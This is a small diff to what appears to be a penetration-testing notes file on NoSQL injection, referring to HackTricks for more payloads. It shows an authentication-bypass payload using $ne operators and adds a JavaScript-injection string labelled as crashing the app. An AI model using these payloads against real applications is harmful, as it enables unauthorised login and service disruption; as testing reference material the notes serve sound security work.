@@ -15,3 +15,9 @@ See https://book.hacktricks.xyz/pentesting-web/nosql-injection for more payloads
 ```txt
 username[$ne]=asdf&password[$ne]=asdf
 ```
+
+# nosql-injection crash app
+
+```txt
+`a'; return this.a != 'BadData’'; var dummy='!`
+```
